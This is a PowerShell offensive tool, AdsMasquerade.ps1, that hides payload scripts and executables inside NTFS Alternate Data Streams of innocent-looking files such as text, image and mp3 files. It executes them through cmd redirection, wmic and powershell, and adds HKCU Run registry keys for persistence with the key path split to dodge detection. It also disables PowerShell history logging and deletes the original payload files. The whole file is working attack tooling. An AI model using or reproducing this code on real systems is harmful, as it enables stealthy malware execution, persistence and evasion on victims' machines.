<#
.SYNOPSIS
   Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: none
   Optional Dependencies: none
   PS cmdlet Dev version: v1.1.7
   
.DESCRIPTION
   Alternate Data Streams (ADS) have been around since the introduction
   of windows NTFS. Basically ADS can be used to hide the presence of a
   secret or malicious file inside the file record of an innocent file.

.NOTES
   Required Dependencies: Payload.bat|ps1|txt|exe + legit.txt|.png
   This module hiddes {txt|bat|ps1|exe} $DATA inside ADS records.
   Remark: Payload.[extension] + legit.txt must be on the same dir.

.Parameter ADS
   Accepts arguments: Enum, Create, Exec and Clear (default: false)

.Parameter StreamData
   Accepts the absolute \ relative path of Payload. [Bat | ps1 | txt | exe]
   which will be incorporated into a legitimate file ADS $DATA Stream. 

.Parameter InTextFile
   Accepts the absolute \ relative path of the legitimate file
   which will be embedded with payload.[extension] ADS $DATA Stream.

.Parameter StartDir
   This Parameters its used to reduce the recursive search time.
   If invoked -ADS 'Enum' to search for files with $DATA Streams

.Parameter Registry
   This parameter allow us to execute our payload ADS $DATA on startup

.EXAMPLE
   PS C:\> Get-Help .\AdsMasquerade.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Enum -streamdata "payload.bat" -StartDir "$Env:TMP"
   Search recursive for payload.bat ADS stream record existence, starting on -startdir 'dir'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Enum -streamdata ":" -StartDir "$Env:USERPROFILE\Desktop"
   Search recursive for ALL ADS stream records existence, starting on -startdir 'directory'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -streamdata "Payload.bat" -intextfile "legit.txt"
   Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Create -streamdata "Payload.bat" -intextfile "legit.png" -registry "true"
   Hidde the data of Payload.bat script inside legit.png ADS stream $DATA record and add startup registry key

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Exec -streamdata "payload.bat" -intextfile "legit.mp3"
   Execute the alternate $DATA stream of the sellected -intextfile 'file'

.EXAMPLE
   PS C:\> .\AdsMasquerade.ps1 -ADS Clear -streamdata "Payload.bat" -intextfile "legit.txt"
   Delete payload.bat $DATA stream from legit.txt and delete ALL registry associated keys

.INPUTS
   None. You cannot pipe objects into AdsMasquerade.ps1

.OUTPUTS
   * Alternate Data Stream settings *
   [ads] LegitFile   : C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
   [ads] payloadPath : C:\Users\pedro\Coding\ADS_TUTORIAL\payload.exe
   [cmd] Execute_ADS : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"

   * Registry persistence settings *
   ADSpersistenceBAT : cmd /R wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"
   PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
   PSChildName       : Run
   PSDrive           : HKCU

.LINK
   https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams
   https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams
   https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/ADS.md
#>


## Non-Positional cmdlet named parameters
[CmdletBinding(PositionalBinding=$false)] param(
   [string]$StreamData="false",
   [string]$InTextFile="false",
   [string]$StartDir="false",
   [string]$Registry="false",
   [string]$ADS="false"
)


Write-Host ""
## Local variable declarations
$ADSDataName = $InTextFile.split('\')[-1]   ## Strip filename from path
$ParseDataName = $StreamData.split('\')[-1] ## Strip filename from path
$Working_Directory = pwd|Select-Object -ExpandProperty Path
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
If($StartDir -ieq "false")
{
   ## Set working dir if not set by user
   $StartDir = "$Working_Directory"
}


If($ADS -ieq "Enum")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Enum files containing payload $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe
       Remark: If -StartDir its not set, then redpill will use
       redpill script working directory to start search recursive.

    .EXAMPLE
        .\AdsMasquerade.ps1 -ADS Enum -StreamData "payload.bat" -StartDir "$Env:TMP"
        Search recursive for payload.bat ADS stream record existence, starting on -StartDir [ dir ]

    .EXAMPLE
        .\AdsMasquerade.ps1 -ADS Enum -StreamData ":" -StartDir "$Env:USERPROFILE\Desktop"
        Search recursive for ALL ADS stream record existence, starting on -StartDir [ dir ]

    .OUTPUTS
       Files containing payload $DATA records
       --------------------------------------
       Stream      : ZoneIdentifier.bat
       PSChildName : blitzo.png:ZoneIdentifier.bat
       FileName    : C:\Users\pedro\coding\ADS_TUTORIAL\blitzo.png
       Length      : 81
    #>

    ## Make sure mandatory parameters are set
    If($StreamData -ieq "false")
    {
        echo "`nFiles containing payload `$DATA records" > $Env:TMP\jdgfjd.log
        echo "--------------------------------------" >> $Env:TMP\jdgfjd.log
        echo "[error] -StreamData mandatory parameter required!`n`n" >> $Env:TMP\jdgfjd.log
        Get-Content -Path "$Env:TMP\jdgfjd.log"
        Remove-Item -Path "$Env:TMP\jdgfjd.log" -Force
        exit ## Exit @AdsMasquerade
    }

    If($StreamData -iMatch '\\')
    {
       $FinalQuery = ${ParseDataName}
    }
    Else
    {
       $FinalQuery = ${StreamData}    
    }

    try{#Start Query
       Get-ChildItem "$StartDir" -Recurse -Force -EA SilentlyContinue | % { Get-Item $_.FullName -stream * | Where-Object {
          $_.PSChildName -iNotMatch "(::|Zone.Identifier)" -and $_.PSChildName -iMatch "$FinalQuery" }
       } | Format-List Stream,PSChildName,FileName,Length > $Env:TMP\lksfdv.log
    }catch{}

    ## Make sure that the logfile exists and contains any data
    $DataStream = [String]::IsNullOrWhiteSpace((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue))
    If(-not($DataStream -ieq "True"))
    {
        ## ADS $DATA records found!
        echo "`nFiles containing payload `$DATA records" > $Env:TMP\iuobla.log
        echo "--------------------------------------" >> $Env:TMP\iuobla.log
        Get-Content -Path "$Env:TMP\iuobla.log"
        Remove-Item -Path "$Env:TMP\iuobla.log" -Force
        ## remove the two top lines of logfile
        (Get-Content -Path "$Env:TMP\lksfdv.log"|Select-Object -Skip 2)|Set-Content -Path "$Env:TMP\lksfdv.log"
        Get-Content -Path "$Env:TMP\lksfdv.log"
        Remove-Item -Path "$Env:TMP\lksfdv.log" -Force
    }
    Else
    {
        ## None ADS $DATA records found!
        echo "`nFiles containing payload `$DATA records" > $Env:TMP\jdgfjd.log
        echo "--------------------------------------" >> $Env:TMP\jdgfjd.log
        echo "[error] Stream Name not found: '$ParseDataName'" >> $Env:TMP\jdgfjd.log
        echo "[error] None ADS `$DATA records found under: '$StartDir'" >> $Env:TMP\jdgfjd.log
        echo "[ inf ] Imput a diferent directory where to start search recursive!`n`n" >> $Env:TMP\jdgfjd.log
        Get-Content -Path "$Env:TMP\jdgfjd.log"
        Remove-Item -Path "$Env:TMP\jdgfjd.log" -Force
        If(Test-Path -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue)
        {
            Remove-Item -Path "$Env:TMP\lksfdv.log" -Force
        }
    }

}
ElseIf($ADS -ieq "Exec")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Execute scripts of $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Exec -StreamData "payload.bat" -InTextFile "legit.mp3"
       Execute\Access the alternate data stream of the sellected -InTextFile [ file ]

    .OUTPUTS
       Executing ADS $Data of
       ----------------------
       C:\Users\pedro\AppData\Local\Temp\legit.txt
    #>

    ## Make sure -InTextFile exists
    If(-not(Test-Path -Path $InTextFile -ErrorAction SilentlyContinue))
    {
        echo "Executing ADS `$Data of" > $Env:TMP\kbfdjk.log
        echo "----------------------" >> $Env:TMP\kbfdjk.log
        echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\kbfdjk.log
        Get-Content -Path "$Env:TMP\kbfdjk.log"
        Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
        exit ## Exit @AdsMasquerade    
    }

    ## Make sure legit.txt contains any ADS $DATA
    # If yes then set -StartDir variable to -InTextFile
    $RawPath = $InTextFile -replace "\\${ADSDataName}",""
    $CheckAds = gci "$InTextFile" -EA SilentlyContinue | % { gi $_.FullName -stream * } |
        Where-Object Stream -ieq "${ParseDataName}" |
        Select-Object -ExpandProperty Stream

    If($CheckAds -ieq "$ParseDataName")
    {
        If($InTextFile -Match '\\')
        {
           ## Check for Absoluct Path inputs
           $StartDir = $RawPath
        }
        Else
        {
           ## Required files are in current directory
           $StartDir = $Working_Directory
        }
    }
    Else
    {
       ## Required Dependencies NOT meet
       echo "Executing ADS `$Data of" > $Env:TMP\kbfdjk.log
       echo "----------------------" >> $Env:TMP\kbfdjk.log
       echo "[error] $ADSDataName does not contain any ADS `$DATA!`n`n" >> $Env:TMP\kbfdjk.log
       Get-Content -Path "$Env:TMP\kbfdjk.log"
       Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
       exit ## Exit @AdsMasquerade
    }

    If($ParseDataName -Match '.txt$')
    {
        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        Start-Process notepad.exe ${InTextFile}:${ParseDataName}
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        ## Nice trick to be abble to execute cmd stdin { < } on PS 
        cmd.exe /c "cmd.exe - < ${InTextFile}:${ParseDataName}"

    }
    ElseIf($ParseDataName -Match '.ps1$')
    {
        $RawLegit = $InTextFile.Split('\\')[-1]                      # blitzo.png
        $RawPayloadPath = $StreamData.Split('\\')[-1]                # Update-KB5005101.ps1
        $LegitPath = $InTextFile -replace "\\${RawLegit}",""         # C:\Users\pedro\Coding\ADS_TUTORIAL
        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        cd $LegitPath;powershell .\${RawLegit}:${RawPayloadPath}
        cd $Working_Directory

    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        ## TODO: Replace wmic.exe syscall by Start-Proces
        # Start-Process -WindowStyle hidden wmic.exe -ArgumentList "process", "call", "create ${InTextFile}:${ParseDataName}" -EA SilentlyContinue|Out-Null
        wmic.exe process call create "${InTextFile}:${ParseDataName}"
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        echo "Executing ADS `$Data of" > $Env:TMP\fdllkf.log
        echo "----------------------" >> $Env:TMP\fdllkf.log
        echo "$InTextFile`n`n" >> $Env:TMP\fdllkf.log
        Get-Content -Path "$Env:TMP\fdllkf.log"
        Remove-Item -Path "$Env:TMP\fdllkf.log" -Force
        wmplayer.exe "${InTextFile}:${ParseDataName}"
    }

}
ElseIf($ADS -ieq "Create")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Hidde scripts {txt|bat|ps1|exe} on $DATA records (ADS)

    .NOTES
       Supported Payload Extensions: txt | bat | ps1 | exe

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Create -StreamData "Payload.bat" -InTextFile "legit.txt"
       Hidde the data of Payload.bat script inside legit.txt ADS stream $DATA record

    .OUTPUTS
       * Alternate Data Stream settings *
       [ads] LegitFile   : C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png
       [ads] PayloadPath : C:\Users\pedro\Coding\ADS_TUTORIAL\payload.exe
       [cmd] Execute_ADS : wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"

       * Registry persistence settings *
       ADSpersistenceBAT : cmd /R wmic.exe process call create "C:\Users\pedro\Coding\ADS_TUTORIAL\blitzo.png:payload.exe"
       PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
       PSChildName       : Run
       PSDrive           : HKCU
    #>

    ## Make sure payload.bat and legit.exe are in the same dir
    # If yes then set -StartDir variable to -InTextFile directory
    If($InTextFile -Match '\\')
    {
       ## Check for Absoluct Path inputs
       $CheckLegit = $InTextFile -replace "\\${ADSDataName}",""
       $CheckPaylo = $StreamData -replace "\\${ParseDataName}",""
    }
    Else
    {
       ## Required files are in current directory
       $CheckLegit = $Working_Directory
       $CheckPaylo = $Working_Directory
    }

    If($CheckLegit -ieq "$CheckPaylo")
    {
        ## The two files are present
        If($CheckLegit -Match '\\')
        {
           ## Set -StartDir to -InTextFile directory
           $StartDir = $CheckLegit
        }
        Else
        {
           ## Required files are in current directory
           $StartDir = $Working_Directory
        }

    }
    Else
    {
       ## Required Dependencies NOT meet
       echo "`nAlternateDataStream" > $Env:TMP\kbfdjk.log
       echo "-------------------" >> $Env:TMP\kbfdjk.log
       echo "[error] $ADSDataName and $ParseDataName must be in the same dir!`n`n" >> $Env:TMP\kbfdjk.log
       Get-Content -Path "$Env:TMP\kbfdjk.log"
       Remove-Item -Path "$Env:TMP\kbfdjk.log" -Force
       exit ## Exit @AdsMasquerade
    }

    ## Check if legit text file exists
    If(Test-Path -Path "$InTextFile" -EA SilentlyContinue)
    {
        ## Hidde Payload data inside text file ADS $DATA stream ^_^
        Set-Content -Path "$InTextFile" -Value $(Get-Content -Path "$StreamData") -Stream $ParseDataName
    }
    Else
    {
       ## Error legit text file not found
       echo "`nAlternateDataStream" > $Env:TMP\gdppdi.log
       echo "-------------------" >> $Env:TMP\gdppdi.log
       echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\gdppdi.log
       Get-Content -Path "$Env:TMP\gdppdi.log"
       Remove-Item -Path "$Env:TMP\gdppdi.log" -Force
       exit ## Exit @AdsMasquerade
    }

    ## Building the output Tables
    If($ParseDataName -Match '.ps1$')
    {
        ## Powershell output Table
        $RawLegit = $InTextFile.Split('\\')[-1]                      # blitzo.png
        $RawPayloadPath = $StreamData.Split('\\')[-1]                # Update-KB5005101.ps1
        $LegitPath = $InTextFile -replace "\\${RawLegit}",""         # C:\Users\pedro\Coding\ADS_TUTORIAL
        echo "`n* Alternate Data Stream settings *" > $Env:TMP\gdfdod.log
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] payloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] Execute_ADS : cd $LegitPath&&powershell .\${RawLegit}:${RawPayloadPath}" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
           }
           ElseIf($_ -iMatch 'Execute_ADS')
           {
              @{ 'ForegroundColor' = 'Green' }
           }
           Else
           {
              @{ 'ForegroundColor' = 'White' }
           }
           Write-Host @stringformat $_
        }
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

        If($Registry -ieq "True")
        {
           #Add to registry RUN
           Write-Host "`n* Registry persistence settings *"
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
           New-ItemProperty -Path "$path1" -Name 'ADSpersistencePS' -Value "cmd /R `"cd $LegitPath&&powershell .\${RawLegit}:${RawPayloadPath}`"" -PropertyType String -Force|Select-Object ADSpersistencePS,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.bat$')
    {
        ## Batch output Table
        echo "`n* Alternate Data Stream settings *" > $Env:TMP\gdfdod.log
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] Execute_ADS : cmd.exe - < ${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
           }
           ElseIf($_ -iMatch 'Execute_ADS')
           {
              @{ 'ForegroundColor' = 'Green' }
           }
           Else
           {
              @{ 'ForegroundColor' = 'White' }
           }
           Write-Host @stringformat $_
        }
        Remove-Item -Path "$StreamData" -Force #Delete payload.bat
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

        If($Registry -ieq "True")
        {
           #Add to registry RUN
           Write-Host "`n* Registry persistence settings *"
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceBAT' -Value "cmd /R `"cmd.exe - < ${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceBAT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.txt$')
    {
        ## Text file output Table
        echo "`n* Alternate Data Stream settings *" > $Env:TMP\gdfdod.log
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] payloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] Execute_ADS : cmd /c notepad.exe ${InTextFile}:${ParseDataName}" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
           }
           ElseIf($_ -iMatch 'Execute_ADS')
           {
              @{ 'ForegroundColor' = 'Green' }
           }
           Else
           {
              @{ 'ForegroundColor' = 'White' }
           }
           Write-Host @stringformat $_
        }
        Remove-Item -Path "$StreamData" -Force #Delete payload.txt
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

        If($Registry -ieq "True")
        {
           #Add to registry RUN
           Write-Host "`n* Registry persistence settings *"
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceTXT' -Value "cmd /R notepad.exe ${InTextFile}:${ParseDataName}" -PropertyType String -Force|Select-Object ADSpersistenceTXT,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.exe$')
    {
        ## Binary.exe output Table
        echo "`n* Alternate Data Stream settings *" > $Env:TMP\gdfdod.log
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] Execute_ADS : wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
           }
           ElseIf($_ -iMatch 'Execute_ADS')
           {
              @{ 'ForegroundColor' = 'Green' }
           }
           Else
           {
              @{ 'ForegroundColor' = 'White' }
           }
           Write-Host @stringformat $_
        }
        Remove-Item -Path "$StreamData" -Force #Delete payload.exe
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

        If($Registry -ieq "True")
        {
           #Add to registry RUN
           Write-Host "`n* Registry persistence settings *"
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceEXE' -Value "cmd /R wmic.exe process call create `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceEXE,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }
    ElseIf($ParseDataName -Match '.mp3$')
    {
        ## filename.mp3 output Table
        echo "`n* Alternate Data Stream settings *" > $Env:TMP\gdfdod.log
        echo "[ads] LegitFile   : $InTextFile" >> $Env:TMP\gdfdod.log
        echo "[ads] PayloadPath : $StreamData" >> $Env:TMP\gdfdod.log
        echo "[cmd] Execute_ADS : wmplayer.exe `"${InTextFile}:${ParseDataName}`"" >> $Env:TMP\gdfdod.log
        Get-Content -Path "$Env:TMP\gdfdod.log"|Format-List|Out-String -Stream|ForEach-Object {
           $stringformat = If($_ -iMatch '(LegitFile|PayloadPath)')
           {
              @{ 'ForegroundColor' = 'DarkGray' }
           }
           ElseIf($_ -iMatch 'Execute_ADS')
           {
              @{ 'ForegroundColor' = 'Green' }
           }
           Else
           {
              @{ 'ForegroundColor' = 'White' }
           }
           Write-Host @stringformat $_
        }
        Remove-Item -Path "$StreamData" -Force #Delete payload.mp3
        Remove-Item -Path "$Env:TMP\gdfdod.log" -Force

        If($Registry -ieq "True")
        {
           #Add to registry RUN
           Write-Host "`n* Registry persistence settings *"
           $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
           New-ItemProperty -Path "$path1" -Name 'ADSpersistenceMP3' -Value "cmd /R wmplayer.exe `"${InTextFile}:${ParseDataName}`"" -PropertyType String -Force|Select-Object ADSpersistenceMP3,PSPath,PSChildName,PSDrive|Format-List|Out-String -Stream|Select-Object -Skip 2
        }
        Else
        {
           Write-Host ""
        }
    }

}
ElseIf($ADS -ieq "Clear")
{

    <#
    .SYNOPSIS
       Author: @r00t-3xp10it
       Helper - Delete payload $DATA stream form file records (ADS)

    .NOTES
       This function deletes $DATA streams of sellected file and ALL
       registry keys added to HKCU/../RUN hive by previous functions.

    .EXAMPLE
       PS C:\> .\AdsMasquerade.ps1 -ADS Clear -StreamData "Payload.bat" -InTextFile "legit.txt"
       Delete payload.bat ADS $DATA stream from legit.txt text file records

    .OUTPUTS
       Clean AlternateDataStream
       -------------------------
       Stream      : :$DATA
       PSChildName : legit.txt
       FileName    : C:\Users\pedro\Desktop\legit.txt
       Status      : Payload.bat Stream $DATA cleared!
       Status      : Payload.bat registry keys deleted!
    #>

    $DisplayBanner = "false"
    ## Make sure -InTextFile exists
    If(Test-Path $InTextFile -EA SilentlyContinue)
    {
        ## Start Query - Build report logfile
        gci "$InTextFile" | % { gi $_.FullName -stream * } |
            Where-Object Stream -ieq "${ParseDataName}" |
            Format-List Stream,PSChildName,FileName > $Env:TMP\gfscgsvs.log

        ## Make sure gfscgsvs.log exists
        If(Test-Path -Path "$Env:TMP\gfscgsvs.log" -EA SilentlyContinue)
        {
            ## Make sure gfscgsvs.log contains any $DATA stream
            $Msopcads = Get-Content -Path "$Env:TMP\gfscgsvs.log"
            If($Msopcads -Match "$ParseDataName")
            {
                ## Delete payload $DATA stream from text file
                Remove-Item -Path "$InTextFile" -Stream $ParseDataName -EA SilentlyContinue -Force

                ## Build Output Table
                echo "Clean AlternateDataStream" > $Env:TMP\OutputTable.log
                echo "-------------------------" >> $Env:TMP\OutputTable.log
                echo "Stream      : :`$DATA" >> $Env:TMP\OutputTable.log
                echo "PSChildName : $ADSDataName" >> $Env:TMP\OutputTable.log
                echo "FileName    : $InTextFile" >> $Env:TMP\OutputTable.log
                echo "Status      : $ADSDataName Stream `$DATA cleared!" >> $Env:TMP\OutputTable.log
                echo "Status      : $ADSDataName registry keys deleted!`n`n" >> $Env:TMP\OutputTable.log
                Get-Content -Path "$Env:TMP\OutputTable.log"
                Remove-item -Path "$Env:TMP\OutputTable.log" -Force
                Remove-item -Path "$Env:TMP\gfscgsvs.log" -Force
            }
            Else
            {
                ## error: logfile does NOT contain any $DATA streams!
                echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
                echo "-------------------------" >> $Env:TMP\lsctt.log
                echo "[error] logfile does NOT contain any `$DATA streams!`n`n" >> $Env:TMP\lsctt.log
                Get-Content -Path "$Env:TMP\lsctt.log"
                Remove-Item -Path "$Env:TMP\lsctt.log" -Force
                Remove-item -Path "$Env:TMP\gfscgsvs.log" -Force
            }
        }
        Else
        {
            ## error: logfile not found!
            echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
            echo "-------------------------" >> $Env:TMP\lsctt.log
            echo "[error] logfile not found!`n`n" >> $Env:TMP\lsctt.log
            Get-Content -Path "$Env:TMP\lsctt.log"
            Remove-Item -Path "$Env:TMP\lsctt.log" -Force
        }
    }
    Else
    {
        ## -InTextFile NOT found error
        echo "Clean AlternateDataStream" > $Env:TMP\lsctt.log
        echo "-------------------------" >> $Env:TMP\lsctt.log
        echo "[error] Not found: $InTextFile `n`n" >> $Env:TMP\lsctt.log
        Get-Content -Path "$Env:TMP\lsctt.log"
        Remove-Item -Path "$Env:TMP\lsctt.log" -Force
    }


    #Delete ALL registry keys added previously by this cmdlet
    $path1 = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\R" + "un" -join ''
    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch 'ADSpersistencePS' }
    If($CheckReg)
    {
       $DisplayBanner = "True"
       Write-Host "Deleted registry keys"
       Write-Host "---------------------"
       Write-Host "deleted     : $path1\ADSpersistencePS" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "ADSpersistencePS" -ErrorAction SilentlyContinue -Force    
    }

    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch 'ADSpersistenceBAT' }
    If($CheckReg)
    {
       If($DisplayBanner -ieq "False")
       {
          $DisplayBanner = "True"
          Write-Host "Deleted registry keys"
          Write-Host "---------------------"       
       }
       Write-Host "deleted     : $path1\ADSpersistenceBAT" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "ADSpersistenceBAT" -ErrorAction SilentlyContinue -Force    
    }
    
    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch 'ADSpersistenceTXT' }
    If($CheckReg)
    {
       If($DisplayBanner -ieq "False")
       {
          $DisplayBanner = "True"
          Write-Host "Deleted registry keys"
          Write-Host "---------------------"       
       }
       Write-Host "deleted     : $path1\ADSpersistenceTXT" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "ADSpersistenceTXT" -ErrorAction SilentlyContinue -Force    
    }

    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch 'ADSpersistenceEXE' }
    If($CheckReg)
    {
       If($DisplayBanner -ieq "False")
       {
          $DisplayBanner = "True"
          Write-Host "Deleted registry keys"
          Write-Host "---------------------"       
       }
       Write-Host "deleted     : $path1\ADSpersistenceEXE" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "ADSpersistenceEXE" -ErrorAction SilentlyContinue -Force    
    }

    $CheckReg = Get-Item -Path "$path1" | Where-Object { $_.Property -iMatch 'ADSpersistenceMP3' }
    If($CheckReg)
    {
       If($DisplayBanner -ieq "False")
       {
          $DisplayBanner = "True"
          Write-Host "Deleted registry keys"
          Write-Host "---------------------"       
       }
       Write-Host "deleted     : $path1\ADSpersistenceMP3" -ForegroundColor DarkGray
       Remove-ItemProperty -Path "$path1" -Name "ADSpersistenceMP3" -ErrorAction SilentlyContinue -Force    
    }

}
